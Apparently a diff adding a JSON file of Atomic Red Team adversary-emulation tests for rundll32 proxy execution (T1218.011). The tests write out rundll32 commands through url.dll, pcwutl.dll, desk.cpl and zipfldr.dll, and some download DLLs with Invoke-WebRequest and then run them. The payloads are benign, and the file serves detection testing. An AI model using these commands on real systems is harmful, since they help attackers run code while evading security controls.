+                        "description": "IcedID uses this TTP as follows:\n  rundll32.exe url.dll,OpenURL %PUBLIC%\\index.hta\nTrickbot uses this TTP as follows:\n  rundll32.exe URL.dll,FileProtocolHandler C:\\\\..\\\\Detail\\\\akteullen.vbs\n\nIn this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with \"rundll32 spawned wscript\"\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "rundll32.exe url.dll,OpenURL \"PathToAtomicsFolder\\T1218.011\\src\\index.hta\"\nrundll32.exe URL.dll,FileProtocolHandler \"PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\"\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Launches an executable using Rundll32 and pcwutl.dll",
+                        "auto_generated_guid": "9f5d081a-ee5a-42f9-a04e-b7bdc487e676",
+                        "description": "Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "exe_to_launch": {
+                                "description": "Path of the executable to launch",
+                                "type": "path",
+                                "default": "%windir%\\System32\\notepad.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Execution of non-dll using rundll32.exe",
+                        "auto_generated_guid": "ae3a8605-b26e-457c-b6b3-2702fd335bac",
+                        "description": "Rundll32.exe running non-dll \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "input_url": {
+                                "description": "Url to download the DLL",
+                                "type": "url",
+                                "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll"
+                            },
+                            "input_file": {
+                                "description": "Non-dll file",
+                                "type": "string",
+                                "default": "C:\\Users\\$env:username\\Downloads\\calc.png"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Non-dll file must exist on disk at specified location\n",
+                                "prereq_command": "if (Test-Path #{input_file}) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "command": "rundll32.exe #{input_file}, StartW\n"
+                        }
+                    },
+                    {
+                        "name": "Rundll32 with Ordinal Value",
+                        "auto_generated_guid": "9fd5a74b-ba89-482a-8a3e-a5feaa3697b0",
+                        "description": "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "input_url": {
+                                "description": "Url to download the DLL",
+                                "type": "url",
+                                "default": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll"
+                            },
+                            "input_file": {
+                                "description": "DLL File",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx64.dll"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "DLL file must exist on disk at specified location\n",
+                                "prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "command_prompt",
+                            "command": "rundll32.exe \"#{input_file}\",#2\n"
+                        }
+                    },
+                    {
+                        "name": "Rundll32 with Control_RunDLL",
+                        "auto_generated_guid": "e4c04b6f-c492-4782-82c7-3bf75eb8077e",
+                        "description": "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "input_url": {
+                                "description": "Url to download the DLL",
+                                "type": "url",
+                                "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll"
+                            },
+                            "input_file": {
+                                "description": "DLL File",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\T1047\\bin\\calc.dll"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "DLL file must exist on disk at specified location\n",
+                                "prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "command_prompt",
+                            "command": "rundll32.exe shell32.dll,Control_RunDLL \"#{input_file}\"\n"
+                        }
+                    },
+                    {
+                        "name": "Rundll32 with desk.cpl",
+                        "auto_generated_guid": "83a95136-a496-423c-81d3-1c6750133917",
+                        "description": "Rundll32.exe loading an executable renamed as .scr using desk.cpl \nReference: \n  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)\nSIGMA rules:\n  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/file_event/file_event_win_new_src_file.yml)\n  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "exe_to_launch": {
+                                "description": "Path of the executable to launch",
+                                "type": "path",
+                                "default": "%windir%\\System32\\calc.exe"
+                            }
+                        },
+                        "executor": {
+                            "name": "command_prompt",
+                            "command": "copy #{exe_to_launch} not_an_scr.scr\nrundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr\n",
+                            "cleanup_command": "del not_an_scr.scr"
+                        }
+                    },
+                    {
+                        "name": "Running DLL with .init extension and function",
+                        "auto_generated_guid": "2d5029f0-ae20-446f-8811-e7511b58e8b6",
+                        "description": "This test, based on common Gamarue tradecraft, consists of a DLL file with a .init extension being run by rundll32.exe. When this DLL file's 'krnl' function is called, it launches a Windows pop-up.\nDLL created with the AtomicTestHarnesses Portable Executable Builder script.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "dll_file": {
+                                "description": "The DLL file to be called",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\T1218.011\\bin\\_WT.init"
+                            },
+                            "dll_url": {
+                                "description": "The URL to the DLL file that must be downloaded",
+                                "type": "url",
+                                "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/bin/_WT.init"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The DLL file to be called must exist at the specified location (#{dll_file})",
+                                "prereq_command": "if (Test-Path \"#{dll_file}\") {exit 0} else {exit 1}",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"#{dll_url}\" -OutFile \"#{dll_file}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "rundll32.exe #{dll_file},krnl\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Rundll32 execute command via FileProtocolHandler",
+                        "auto_generated_guid": "f3ad3c5b-1db1-45c1-81bf-d3370ebab6c8",
+                        "description": "Test execution of a command using rundll32.exe and the FileProtocolHandler technique.\nUpon execution, calc.exe will be launched.\nThis technique is documented by Levan Abesadze - https://medium.com/@Wolverineisstillalive/system-binary-proxy-execution-rundll32-bypass-method-790871e1f2b7\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "command_to_execute": {
+                                "description": "Command for rundll32.exe to execute",
+                                "type": "string",
+                                "default": "calc.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "rundll32.exe url.dll,FileProtocolHandler #{command_to_execute}\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Rundll32 execute payload by calling RouteTheCall",
+                        "auto_generated_guid": "8a7f56ee-10e7-444c-a139-0109438288eb",
+                        "description": "Launch an executable payload by calling RouteTheCall. Test execution of a command using rundll32.exe to execute a payload{calc.exe} by calling RouteTheCall. Upon execution, calc.exe will be launched.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Zipfldr.yml\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "exe_to_launch": {
+                                "description": "Path of the executable to launch",
+                                "type": "path",
+                                "default": "'%windir%\\System32\\calc.exe'"
+                            }
+                        },
+                        "executor": {
+                            "command": "rundll32.exe zipfldr.dll,RouteTheCall \"#{exe_to_launch}\"",
+                            "cleanup_command": null,
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 14:19:38"
+}
